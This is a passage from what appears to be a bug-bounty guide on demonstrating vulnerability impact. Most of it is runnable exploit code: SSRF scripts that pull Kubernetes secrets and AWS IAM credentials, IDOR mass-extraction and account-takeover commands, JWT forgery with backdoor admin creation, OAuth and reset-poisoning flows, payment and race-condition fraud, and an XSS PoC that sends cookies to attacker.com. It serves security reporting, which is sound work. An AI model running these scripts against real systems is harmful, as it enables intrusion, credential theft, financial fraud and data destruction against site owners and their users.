  ::

  ::tabs-item{icon="i-lucide-container" label="Container & K8s Exploitation"}

  ```bash
  # SSRF → Kubernetes API → Cluster Compromise

  # Step 1: Access K8s API
  curl -s "https://target.com/fetch?url=https://kubernetes.default.svc/api" \
    --insecure 2>/dev/null | jq '.'

  # Step 2: List namespaces
  curl -s "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces" | \
    jq '.items[].metadata.name'

  # Step 3: Extract secrets
  curl -s "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets" | \
    jq '.items[] | {name: .metadata.name, data_keys: (.data | keys)}'

  # Step 4: Decode secrets
  curl -s "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/namespaces/default/secrets/db-credentials" | \
    jq '.data | to_entries[] | {key: .key, value: (.value | @base64d)}'

  # Step 5: List pods (demonstrate cluster-wide access)
  curl -s "https://target.com/fetch?url=https://kubernetes.default.svc/api/v1/pods" | \
    jq '.items[] | {name: .metadata.name, namespace: .metadata.namespace, status: .status.phase}'

  # Impact statement
  echo "IMPACT: SSRF provides access to the Kubernetes API server, allowing:
  - Extraction of all cluster secrets (database credentials, API keys)
  - Pod enumeration across all namespaces
  - Potential pod creation (RCE in cluster)
  - Service account token theft for persistent access
  
  Cluster contains $(curl -s ... | jq '.items | length') pods across 
  $(curl -s ... | jq '[.items[].metadata.namespace] | unique | length') namespaces."
  ```
  ::
::

### IDOR Impact Escalation

::badge
High
::

::accordion
  ::accordion-item
  ---
  icon: i-lucide-eye
  label: "Read Access → Mass Data Breach"
  ---

  ```bash
  # Step 1: Confirm single record IDOR
  curl -s "https://target.com/api/users/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.'

  # Step 2: Quantify the blast radius
  # Determine total accessible records
  TOTAL=$(curl -s "https://target.com/api/users?limit=1" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.meta.total')
  echo "Total accessible user records: $TOTAL"

  # Step 3: Demonstrate breadth of sensitive data per record
  curl -s "https://target.com/api/users/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | \
    jq '{
      pii: {
        email: .email,
        phone: .phone,
        address: .address,
        date_of_birth: .date_of_birth,
        ssn_present: (.ssn != null)
      },
      financial: {
        payment_methods: (.payment_methods | length),
        has_bank_details: (.bank_account != null),
        transaction_history: (.transactions | length)
      },
      authentication: {
        has_api_keys: (.api_keys | length > 0),
        has_oauth_tokens: (.oauth_connections | length > 0),
        mfa_enabled: .mfa_enabled
      }
    }'

  # Step 4: Show extraction rate (how fast can data be exfiltrated)
  START=$(date +%s)
  for id in $(seq 1 100); do
    curl -s -o /dev/null "https://target.com/api/users/${id}" \
      -H "Authorization: Bearer ATTACKER_TOKEN"
  done
  END=$(date +%s)
  RATE=$((100 / (END - START)))
  echo "Extraction rate: $RATE records/second"
  echo "Estimated time to exfil all $TOTAL records: $(echo "$TOTAL / $RATE / 3600" | bc) hours"

  # Step 5: Check for bulk endpoints that accelerate extraction
  for endpoint in /api/users/export /api/users/download /api/users.csv \
    "/api/users?limit=10000" /api/admin/users/export; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com${endpoint}" \
      -H "Authorization: Bearer ATTACKER_TOKEN" --max-time 5)
    [ "$STATUS" = "200" ] && echo "[BULK ENDPOINT] ${endpoint} — accelerated exfiltration possible"
  done

  # Impact statement
  echo "IMPACT: IDOR allows unauthorized access to $TOTAL user profiles 
  containing PII (email, phone, address, DOB), financial data 
  (payment methods, transaction history), and authentication material 
  (API keys, OAuth tokens). Full exfiltration is achievable in 
  approximately $(echo "$TOTAL / $RATE / 3600" | bc) hours at 
  $RATE records/second."
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-pencil
  label: "Write Access → Account Takeover at Scale"
  ---

  ```bash
  # Step 1: Confirm write IDOR
  # Change a non-sensitive field on victim's account
  curl -s -X PATCH "https://target.com/api/users/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"bio":"IDOR_WRITE_TEST"}'

  # Verify the change took effect
  curl -s "https://target.com/api/users/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.bio'

  # Step 2: Escalate to Account Takeover
  # Change victim's email
  curl -s -X PATCH "https://target.com/api/users/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"email":"attacker@evil.com"}'

  # Request password reset to attacker's email
  curl -s -X POST "https://target.com/api/password/reset" \
    -d '{"email":"attacker@evil.com"}'

  # Step 3: Demonstrate privilege escalation via write IDOR
  # Change victim's role to admin
  curl -s -X PATCH "https://target.com/api/users/ATTACKER_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"role":"admin","is_admin":true}'

  # Verify privilege escalation
  curl -s "https://target.com/api/admin/dashboard" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | jq '.admin_access'

  # Step 4: Demonstrate mass impact
  echo "IMPACT: Write IDOR enables:
  - Account takeover of ANY user by changing their email
  - Privilege escalation from user to admin
  - Data manipulation across all $TOTAL accounts
  - Mass account lockout by changing emails/passwords
  - Financial fraud by modifying payment details/shipping addresses"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-trash
  label: "Delete Access → Mass Destruction"
  ---

  ```bash
  # Step 1: Confirm delete IDOR (on your OWN test data only)
  # Create a test resource
  TEST_ID=$(curl -s -X POST "https://target.com/api/documents" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -d '{"title":"test_for_delete_idor","content":"test"}' | jq -r '.id')

  # Delete it using another user's perspective
  curl -s -X DELETE "https://target.com/api/documents/${TEST_ID}" \
    -H "Authorization: Bearer ATTACKER_TOKEN" -w "\nHTTP Status: %{http_code}\n"

  # Step 2: Demonstrate scope of deletable resources
  echo "IMPACT: Delete IDOR allows destruction of:"
  
  for resource in users orders documents invoices messages posts comments; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -X DELETE "https://target.com/api/${resource}/1" \
      -H "Authorization: Bearer ATTACKER_TOKEN" --max-time 3)
    # Note: Don't actually delete — just check if the endpoint responds differently than 403
    echo "  /api/${resource}/{id} — DELETE returns HTTP $STATUS"
  done

  # Impact statement
  echo "IMPACT: Delete IDOR enables mass destruction of user data.
  An attacker could systematically delete all user accounts, orders,
  documents, and messages across the entire platform, causing:
  - Complete data loss for all users
  - Business operation shutdown
  - Legal liability for destroyed customer records
  - Potential irrecoverable damage if backups are insufficient"
  ```
  ::
::

### Authentication Bypass Impact

::badge
Critical
::

::tabs
  ::tabs-item{icon="i-lucide-key" label="JWT Exploitation Impact"}

  ```bash
  # Demonstrate JWT vulnerability impact — not just the bypass, but what it grants

  # Step 1: Forge admin JWT
  # (After discovering algorithm none / weak secret / key confusion)
  FORGED_TOKEN=$(python3 -c "
  import jwt
  token = jwt.encode({
      'user_id': 1,
      'email': 'admin@target.com',
      'role': 'super_admin',
      'permissions': ['*'],
      'exp': 9999999999
  }, '', algorithm='HS256')
  print(token)
  " 2>/dev/null)

  # Step 2: Demonstrate admin access
  echo "=== Admin Dashboard ==="
  curl -s "https://target.com/api/admin/dashboard" \
    -H "Authorization: Bearer $FORGED_TOKEN" | jq '.'

  echo "=== User Management ==="
  curl -s "https://target.com/api/admin/users?limit=5" \
    -H "Authorization: Bearer $FORGED_TOKEN" | \
    jq '.users[] | {id, email, role}'

  echo "=== System Configuration ==="
  curl -s "https://target.com/api/admin/config" \
    -H "Authorization: Bearer $FORGED_TOKEN" | jq 'keys'

  echo "=== Audit Logs (covering tracks) ==="
  curl -s "https://target.com/api/admin/audit-log?limit=5" \
    -H "Authorization: Bearer $FORGED_TOKEN" | jq '.'

  echo "=== Create Backdoor Admin Account ==="
  curl -s -X POST "https://target.com/api/admin/users" \
    -H "Authorization: Bearer $FORGED_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{
      "email": "service-account-backup@target-internal.com",
      "role": "admin",
      "name": "System Backup Service"
    }' | jq '.'

  # Step 3: Demonstrate any-user impersonation
  echo "=== Impersonate Any User ==="
  for user_id in 1 2 3 100 1000; do
    IMPERSONATION_TOKEN=$(python3 -c "
  import jwt
  print(jwt.encode({'user_id': $user_id, 'role': 'user'}, '', algorithm='HS256'))
  " 2>/dev/null)
    
    EMAIL=$(curl -s "https://target.com/api/me" \
      -H "Authorization: Bearer $IMPERSONATION_TOKEN" | jq -r '.email')
    echo "  User $user_id: $EMAIL"
  done

  echo "
  IMPACT: JWT algorithm vulnerability allows forging tokens for ANY user
  on the platform, including administrators. This enables:
  - Full admin panel access
  - User management (create, modify, delete any account)
  - System configuration changes
  - Audit log access (and potential manipulation)
  - Impersonation of ANY of the platform's users
  - Creation of persistent backdoor admin accounts"
  ```
  ::

  ::tabs-item{icon="i-lucide-shield-off" label="OAuth/SSO Bypass Impact"}

  ```bash
  # Demonstrate OAuth bypass impact

  # Step 1: Exploit open redirect in OAuth flow
  MALICIOUS_URL="https://accounts.google.com/o/oauth2/auth?client_id=TARGET_CLIENT_ID&redirect_uri=https://target.com/callback/../redirect?url=https://attacker.com&response_type=token&scope=email+profile"

  echo "Exploit URL: $MALICIOUS_URL"

  # Step 2: Capture the token on attacker server
  echo "When victim clicks the link, the OAuth token is sent to attacker.com"
  echo "Token format: https://attacker.com/#access_token=ya29.xxxx&token_type=bearer"

  # Step 3: Demonstrate account access with stolen token
  STOLEN_TOKEN="ya29.stolen_oauth_token"
  curl -s "https://target.com/api/auth/oauth/callback?token=$STOLEN_TOKEN" | jq '.'

  # Step 4: Show what the stolen session grants
  SESSION=$(curl -s "https://target.com/api/auth/oauth/callback?token=$STOLEN_TOKEN" | jq -r '.session_token')

  echo "=== Victim's Profile ==="
  curl -s "https://target.com/api/me" -H "Cookie: session=$SESSION" | jq '.'

  echo "=== Victim's Private Data ==="
  curl -s "https://target.com/api/me/private" -H "Cookie: session=$SESSION" | jq '.'

  echo "=== Victim's Payment Methods ==="
  curl -s "https://target.com/api/me/payment-methods" -H "Cookie: session=$SESSION" | jq '.'

  echo "
  IMPACT: OAuth redirect vulnerability allows stealing authentication tokens
  from ANY user who clicks the crafted link. Combined with social engineering
  (disguised as a legitimate login link), this enables:
  - One-click account takeover of any user
  - Access to all private data, payment methods, and connected services
  - No visible warning to the victim (redirect appears to come from Google/OAuth provider)
  - Bypasses 2FA (OAuth session is already authenticated)"
  ```
  ::

  ::tabs-item{icon="i-lucide-lock-open" label="Password Reset Poisoning Impact"}

  ```bash
  # Demonstrate password reset poisoning → mass account takeover

  # Step 1: Confirm Host header poisoning
  curl -s -X POST "https://target.com/api/password/reset" \
    -H "Host: attacker.com" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@target.com"}' -v 2>&1 | grep -i "location\|host"

  # Step 2: Show the poisoned reset link format
  echo "Victim receives email with link: https://attacker.com/reset?token=RESET_TOKEN"
  echo "Attacker captures the token when victim clicks"

  # Step 3: Demonstrate reset token usage
  CAPTURED_TOKEN="captured_from_attacker_server"
  curl -s -X POST "https://target.com/api/password/reset/confirm" \
    -H "Content-Type: application/json" \
    -d "{
      \"token\": \"$CAPTURED_TOKEN\",
      \"new_password\": \"attacker_password_123!\"
    }"

  # Step 4: Login as victim
  curl -s -X POST "https://target.com/api/login" \
    -d '{"email":"victim@target.com","password":"attacker_password_123!"}'

  # Step 5: Demonstrate mass targeting capability
  echo "=== Mass ATO Potential ==="
  echo "The attacker can target ANY email address:"
  for target_email in ceo@target.com cto@target.com admin@target.com; do
    curl -s -o /dev/null -w "  $target_email → HTTP %{http_code}\n" \
      -X POST "https://target.com/api/password/reset" \
      -H "Host: attacker.com" \
      -d "{\"email\":\"$target_email\"}"
  done

  echo "
  IMPACT: Password reset poisoning via Host header injection allows 
  attackers to takeover ANY account on the platform by:
  1. Triggering a password reset for any email address
  2. Poisoning the reset link to point to the attacker's server
  3. Capturing the reset token when the victim clicks the link
  4. Using the token to set a new password
  
  This requires only that the victim clicks a link in a legitimate-looking
  password reset email from target.com. No prior access required.
  All users are vulnerable."
  ```
  ::
::

---

## Impact Demonstration for Business Logic Vulnerabilities

::badge
Highest Value Category
::

### Financial Impact Demonstrations

::accordion
  ::accordion-item
  ---
  icon: i-lucide-dollar-sign
  label: Price Manipulation
  ---

  ```bash
  # Demonstrate financial damage from price manipulation

  # Step 1: Normal purchase flow (baseline)
  echo "=== Normal Flow ==="
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"product_id":"premium-plan","quantity":1}' | jq '.cart_total'
  # Output: $299.00

  # Step 2: Manipulated purchase
  echo "=== Manipulated Flow ==="
  
  # Technique A: Client-side price override
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"product_id":"premium-plan","quantity":1,"price":0.01}' | jq '.cart_total'
  # Output: $0.01

  # Technique B: Negative quantity for credit
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"product_id":"cheap-item","quantity":-10}' | jq '.cart_total'
  # Output: -$50.00 (credit applied to account)

  # Technique C: Currency confusion
  curl -s -X POST "https://target.com/api/checkout" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"cart_id":"CART_123","currency":"IDR"}' | jq '.charged_amount'
  # Charged 299 IDR ($0.02) instead of $299 USD

  # Technique D: Integer overflow
  curl -s -X POST "https://target.com/api/cart/add" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"product_id":"item","quantity":2147483647}' | jq '.cart_total'
  # Integer overflow → negative or zero price

  # Step 3: Complete the manipulated purchase
  curl -s -X POST "https://target.com/api/checkout/pay" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"cart_id":"CART_123","payment_method":"card_on_file"}'

  # Step 4: Verify the order was created at manipulated price
  curl -s "https://target.com/api/orders/latest" \
    -H "Authorization: Bearer TOKEN" | \
    jq '{order_id, items, total_charged, status}'

  echo "
  IMPACT: Price manipulation vulnerability allows purchasing any product
  at an attacker-controlled price. Financial impact calculation:
  - Premium plan value: \$299/month × 12 months = \$3,588/year per attacker
  - If exploited at scale: \$3,588 × 1000 fake accounts = \$3,588,000/year
  - Negative quantity attack creates account credits from nothing
  - Currency confusion enables 99.99% discount on any purchase"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-repeat
  label: Race Condition Financial Abuse
  ---

  ```bash
  # Demonstrate financial impact of race conditions

  # Scenario: Gift card / coupon redemption race
  echo "=== Pre-exploit Balance ==="
  curl -s "https://target.com/api/wallet" \
    -H "Authorization: Bearer TOKEN" | jq '.balance'
  # Output: $0.00

  # Race condition: Redeem same $100 gift card 20 times
  echo "=== Exploiting Race Condition ==="
  for i in $(seq 1 20); do
    curl -s -X POST "https://target.com/api/gift-card/redeem" \
      -H "Authorization: Bearer TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"code":"GIFT-100-ABCDEF"}' &
  done
  wait

  echo "=== Post-exploit Balance ==="
  curl -s "https://target.com/api/wallet" \
    -H "Authorization: Bearer TOKEN" | jq '.balance'
  # Output: $2,000.00 (20 × $100 instead of 1 × $100)

  # Scenario: Double-spend in fund transfer
  echo "=== Transfer Race Condition ==="
  ACCOUNT_BALANCE=$(curl -s "https://target.com/api/wallet" \
    -H "Authorization: Bearer TOKEN" | jq '.balance')
  echo "Starting balance: $ACCOUNT_BALANCE"

  # Send balance to two different accounts simultaneously
  curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"to\":\"account_a\",\"amount\":$ACCOUNT_BALANCE}" &
  curl -s -X POST "https://target.com/api/transfer" \
    -H "Authorization: Bearer TOKEN" \
    -d "{\"to\":\"account_b\",\"amount\":$ACCOUNT_BALANCE}" &
  wait

  # Check if both transfers succeeded
  curl -s "https://target.com/api/wallet" -H "Authorization: Bearer TOKEN" | jq '.'
  curl -s "https://target.com/api/wallet" -H "Authorization: Bearer ACCOUNT_A_TOKEN" | jq '.'
  curl -s "https://target.com/api/wallet" -H "Authorization: Bearer ACCOUNT_B_TOKEN" | jq '.'

  echo "
  IMPACT: Race condition enables:
  - Gift card value multiplication: \$100 card → \$2,000+ credit
  - Double-spend: transfer full balance to two accounts simultaneously  
  - Coupon stacking beyond intended limits
  - Free subscription upgrades
  
  Estimated financial exposure per attacker: UNLIMITED
  Combined with automation, this vulnerability enables infinite money generation."
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-credit-card
  label: Payment Flow Bypass
  ---

  ```bash
  # Demonstrate complete payment bypass

  # Step 1: Map the payment flow
  echo "Normal flow: Cart → Checkout → Payment → Confirmation → Order"

  # Step 2: Create order with items
  ORDER_ID=$(curl -s -X POST "https://target.com/api/orders" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"items":[{"id":"expensive-item","quantity":1,"price":999.99}]}' | \
    jq -r '.order_id')
  echo "Order created: $ORDER_ID"
  echo "Order total: \$999.99"

  # Step 3: Skip payment — directly call confirmation endpoint
  curl -s -X POST "https://target.com/api/orders/${ORDER_ID}/confirm" \
    -H "Authorization: Bearer TOKEN" | jq '.'

  # Step 4: Check order status
  STATUS=$(curl -s "https://target.com/api/orders/${ORDER_ID}" \
    -H "Authorization: Bearer TOKEN" | jq -r '.status')
  PAID=$(curl -s "https://target.com/api/orders/${ORDER_ID}" \
    -H "Authorization: Bearer TOKEN" | jq -r '.payment_status')
  echo "Order status: $STATUS"
  echo "Payment status: $PAID"

  # Step 5: Alternative — manipulate payment callback
  # Forge a payment success webhook
  curl -s -X POST "https://target.com/api/webhooks/payment" \
    -H "Content-Type: application/json" \
    -d "{
      \"event\": \"payment.success\",
      \"order_id\": \"$ORDER_ID\",
      \"amount\": 999.99,
      \"status\": \"paid\"
    }"

  # Verify order is now marked as paid
  curl -s "https://target.com/api/orders/${ORDER_ID}" \
    -H "Authorization: Bearer TOKEN" | jq '{status, payment_status, items}'

  echo "
  IMPACT: Payment bypass allows obtaining products/services without payment:
  - Direct confirmation endpoint skips payment verification
  - Forged payment webhook marks unpaid orders as paid
  - No payment processor validation on server side
  
  Financial impact per exploitation: \$999.99 (value of premium product)
  Scaled impact: UNLIMITED — any product at any price, no payment required"
  ```
  ::
::

---

## Impact Evidence Collection

::tip
Evidence quality directly determines whether your demonstrated impact is accepted. Use multiple evidence formats — HTTP logs, screenshots, video, and scripted reproduction steps.
::

### HTTP Evidence Capture

::tabs
  ::tabs-item{icon="i-lucide-file-text" label="Full Request/Response Logging"}

  ```bash
  # Method 1: Verbose curl with full headers
  curl -v -X POST "https://target.com/api/vulnerable" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"exploit":"payload"}' \
    2>&1 | tee evidence_$(date +%s).txt

  # Method 2: Separate request and response capture
  # Save request
  cat << 'REQUEST' > evidence_request.txt
  POST /api/vulnerable HTTP/2
  Host: target.com
  Authorization: Bearer TOKEN
  Content-Type: application/json
  Content-Length: 25

  {"exploit":"payload"}
  REQUEST

  # Capture response with timing
  curl -s -w "\n\n--- Timing ---\nDNS: %{time_namelookup}s\nConnect: %{time_connect}s\nTLS: %{time_appconnect}s\nTotal: %{time_total}s\nHTTP Code: %{http_code}\nSize: %{size_download} bytes\n" \
    -X POST "https://target.com/api/vulnerable" \
    -H "Authorization: Bearer TOKEN" \
    -D evidence_response_headers.txt \
    -o evidence_response_body.txt \
    -d '{"exploit":"payload"}'

  # Method 3: Multi-step exploitation with sequential evidence
  echo "=== Step 1: Reconnaissance ===" > exploitation_chain.txt
  echo "Timestamp: $(date -u)" >> exploitation_chain.txt
  curl -v "https://target.com/api/target-endpoint" 2>&1 >> exploitation_chain.txt

  echo -e "\n=== Step 2: Injection ===" >> exploitation_chain.txt
  echo "Timestamp: $(date -u)" >> exploitation_chain.txt
  curl -v -X POST "https://target.com/api/vulnerable" \
    -d '{"payload":"exploit"}' 2>&1 >> exploitation_chain.txt

  echo -e "\n=== Step 3: Impact Verification ===" >> exploitation_chain.txt
  echo "Timestamp: $(date -u)" >> exploitation_chain.txt
  curl -v "https://target.com/api/proof-of-impact" 2>&1 >> exploitation_chain.txt

  # Method 4: HAR file capture from Burp/browser
  echo "Export HAR from browser DevTools: Network tab → Right-click → Save all as HAR"
  echo "Export from Burp: Select items → Right-click → Save items"
  ```
  ::

  ::tabs-item{icon="i-lucide-video" label="Terminal Recording"}

  ```bash
  # asciinema — records terminal sessions as replayable text
  # Install: pip3 install asciinema

  # Record the exploitation session
  asciinema rec impact_demonstration.cast

  # Inside the recording, perform your exploitation steps:
  echo "=== XSS Account Takeover Demonstration ==="
  echo "Step 1: Deliver payload to victim..."
  curl -s "https://target.com/search?q=<script>...</script>"
  echo ""
  echo "Step 2: Verify cookie theft on attacker server..."
  echo "Received: session=abc123..."
  echo ""
  echo "Step 3: Replay session as victim..."
  curl -s "https://target.com/api/me" -H "Cookie: session=abc123" | jq '.'
  echo ""
  echo "Step 4: Change victim's email..."
  curl -s -X PUT "https://target.com/api/user/email" \
    -H "Cookie: session=abc123" \
    -d '{"email":"attacker@evil.com"}'
  echo "Account takeover complete."

  # Stop recording: exit or Ctrl+D

  # Share: asciinema upload impact_demonstration.cast
  # Or embed in report: <script src="https://asciinema.org/a/ID.js" async></script>

  # Alternative: script command (built-in)
  script -q impact_demo_$(date +%Y%m%d).log
  # ... perform exploitation ...
  exit
  ```
  ::

  ::tabs-item{icon="i-lucide-image" label="Screenshot Automation"}

  ```bash
  # Automated screenshot capture at each exploitation step
  # Using gowitness
  echo "https://target.com/search?q=PAYLOAD" | gowitness file -f - -P screenshots/

  # Using eyewitness
  eyewitness --web -f urls.txt -d screenshots/

  # Using chromium headless for specific pages
  chromium --headless --screenshot=step1_injection.png \
    --window-size=1920,1080 \
    "https://target.com/search?q=<script>alert(document.domain)</script>"

  chromium --headless --screenshot=step2_cookie_theft.png \
    --window-size=1920,1080 \
    "https://attacker.com/logs"

  chromium --headless --screenshot=step3_account_takeover.png \
    --window-size=1920,1080 \
    "https://target.com/api/me"

  # Combine screenshots into a single evidence document
  convert step1_injection.png step2_cookie_theft.png step3_account_takeover.png \
    -append full_exploitation_evidence.png

  # Add annotations
  convert full_exploitation_evidence.png \
    -gravity NorthWest -pointsize 24 -fill red \
    -annotate +10+10 "Step 1: XSS Injection" \
    -annotate +10+550 "Step 2: Cookie Captured" \
    -annotate +10+1100 "Step 3: Account Taken Over" \
    annotated_evidence.png
  ```
  ::
::

### Reproducible PoC Scripts

::code-group

```python [xss_ato_poc.py]
#!/usr/bin/env python3
"""
XSS → Account Takeover PoC
Target: target.com
Vulnerability: Reflected XSS in /search?q= parameter
Impact: Full account takeover of any user

Usage: python3 xss_ato_poc.py
"""

import requests
import http.server
import threading
import urllib.parse
import json
import time

TARGET = "https://target.com"
ATTACKER_SERVER = "https://attacker.com"
LISTEN_PORT = 8443

# Store stolen data
stolen_data = {}

class StealHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        if 'cookie' in params:
            stolen_data['cookie'] = params['cookie'][0]
            print(f"[+] Cookie stolen: {stolen_data['cookie'][:50]}...")
        self.send_response(200)
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress logs

def start_listener():
    server = http.server.HTTPServer(('0.0.0.0', LISTEN_PORT), StealHandler)
    server.handle_request()

print("=" * 60)
print("XSS → Account Takeover PoC")
print("=" * 60)

# Step 1: Generate exploit URL
payload = f'<script>new Image().src="{ATTACKER_SERVER}:{LISTEN_PORT}/steal?cookie="+encodeURIComponent(document.cookie)</script>'
exploit_url = f"{TARGET}/search?q={urllib.parse.quote(payload)}"
print(f"\n[1] Exploit URL generated:")
print(f"    {exploit_url[:100]}...")

# Step 2: Start listener
print(f"\n[2] Starting listener on port {LISTEN_PORT}...")
listener = threading.Thread(target=start_listener, daemon=True)
listener.start()
print(f"    Waiting for victim to click the link...")

# Step 3: Wait for cookie
while 'cookie' not in stolen_data:
    time.sleep(1)

# Step 4: Replay session
print(f"\n[3] Replaying stolen session...")
session = requests.Session()
session.headers['Cookie'] = stolen_data['cookie']

profile = session.get(f"{TARGET}/api/me").json()
print(f"    Victim email: {profile.get('email')}")
print(f"    Victim role: {profile.get('role')}")

# Step 5: Change email
print(f"\n[4] Changing victim's email to attacker-controlled address...")
change = session.put(f"{TARGET}/api/user/email", 
    json={"email": "attacker@evil.com"})
print(f"    Email change status: {change.status_code}")

# Step 6: Trigger password reset
print(f"\n[5] Triggering password reset to attacker email...")
reset = requests.post(f"{TARGET}/api/password/reset",
    json={"email": "attacker@evil.com"})
print(f"    Reset status: {reset.status_code}")

print(f"\n[✓] Account takeover complete!")
print(f"    Attacker now receives password reset → sets new password → full ATO")
```

```python [idor_mass_exfil_poc.py]
#!/usr/bin/env python3
"""
IDOR → Mass Data Exfiltration PoC
Target: target.com
Vulnerability: IDOR on /api/users/{id}
Impact: Access to all user records

Usage: python3 idor_mass_exfil_poc.py --token TOKEN --sample 5
"""

import requests
import json
import argparse
import sys
from datetime import datetime

TARGET = "https://target.com"

def assess_impact(token, sample_size):
    headers = {"Authorization": f"Bearer {token}"}
    
    print("=" * 60)
    print("IDOR Mass Data Exfiltration — Impact Demonstration")
    print(f"Timestamp: {datetime.utcnow().isoformat()}")
    print("=" * 60)
    
    # Step 1: Determine total record count
    print("\n[1] Determining total accessible records...")
    resp = requests.get(f"{TARGET}/api/users?limit=1", headers=headers)
    data = resp.json()
    total = data.get('meta', {}).get('total') or data.get('total', 'unknown')
    print(f"    Total records accessible: {total}")
    
    # Step 2: Sample records to classify data sensitivity
    print(f"\n[2] Sampling {sample_size} records for data classification...")
    sensitive_fields = {
        'critical': [], 'high': [], 'medium': [], 'low': []
    }
    
    for i in range(1, sample_size + 1):
        resp = requests.get(f"{TARGET}/api/users/{i}", headers=headers)
        if resp.status_code == 200:
            record = resp.json()
            fields = list(record.keys())
            
            for f in fields:
                if any(k in f.lower() for k in ['password', 'ssn', 'card', 'secret', 'token']):
                    sensitive_fields['critical'].append(f)
                elif any(k in f.lower() for k in ['email', 'phone', 'address', 'birth']):
                    sensitive_fields['high'].append(f)
                elif any(k in f.lower() for k in ['name', 'ip', 'location']):
                    sensitive_fields['medium'].append(f)
                else:
                    sensitive_fields['low'].append(f)
            
            # Redact and display
            redacted = {}
            for k, v in record.items():
                if isinstance(v, str) and len(v) > 5:
                    redacted[k] = v[:3] + '***'
                else:
                    redacted[k] = '[REDACTED]'
            print(f"    Record {i}: {json.dumps(redacted, indent=2)[:200]}...")
    
    # Step 3: Summarize impact
    print("\n" + "=" * 60)
    print("IMPACT SUMMARY")
    print("=" * 60)
    print(f"Total accessible records: {total}")
    print(f"Critical fields: {list(set(sensitive_fields['critical']))}")
    print(f"High fields: {list(set(sensitive_fields['high']))}")
    print(f"Medium fields: {list(set(sensitive_fields['medium']))}")
    print(f"\nRecord size: ~{len(json.dumps(record))} bytes")
    if isinstance(total, int):
        total_size_mb = (len(json.dumps(record)) * total) / 1048576
        print(f"Estimated total data at risk: {total_size_mb:.1f} MB")
    
    print(f"\nAll data retrievable by ANY authenticated user.")
    print(f"No rate limiting detected during sampling.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--token", required=True)
    parser.add_argument("--sample", type=int, default=5)
    args = parser.parse_args()
    assess_impact(args.token, args.sample)
```

```bash [ssrf_impact_poc.sh]
#!/bin/bash
# SSRF → Cloud Infrastructure Compromise PoC
# Target: target.com
# Vulnerability: SSRF in /api/fetch?url= parameter
# Impact: Full AWS infrastructure access

SSRF_ENDPOINT="https://target.com/api/fetch?url="

echo "============================================"
echo "  SSRF Impact Demonstration PoC"
echo "  Timestamp: $(date -u)"
echo "============================================"

echo ""
echo "[1] Confirming SSRF..."
CONFIRM=$(curl -s "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/" --max-time 5)
if [ -n "$CONFIRM" ]; then
  echo "    SSRF confirmed — cloud metadata accessible"
else
  echo "    SSRF not confirmed — aborting"
  exit 1
fi

echo ""
echo "[2] Retrieving IAM credentials..."
ROLE=$(curl -s "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/iam/security-credentials/" --max-time 5)
echo "    IAM Role: $ROLE"

CREDS=$(curl -s "${SSRF_ENDPOINT}http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}" --max-time 5)
echo "    AccessKeyId: $(echo $CREDS | jq -r '.AccessKeyId')"
echo "    Expiration: $(echo $CREDS | jq -r '.Expiration')"

echo ""
echo "[3] Demonstrating infrastructure access..."
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')

echo "    Identity: $(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null)"
echo "    S3 Buckets: $(aws s3 ls 2>/dev/null | wc -l)"
echo "    EC2 Instances: $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text 2>/dev/null | wc -w)"
echo "    RDS Databases: $(aws rds describe-db-instances --query 'DBInstances[].DBInstanceIdentifier' --output text 2>/dev/null | wc -w)"
echo "    Secrets: $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null | wc -w)"

echo ""
echo "============================================"
echo "  IMPACT: Full AWS infrastructure compromise"
echo "  via SSRF → metadata → IAM credential theft"
echo "============================================"
```

::

---

## Impact Amplification Techniques

::badge
Advanced
::

### Chaining for Maximum Impact

::note
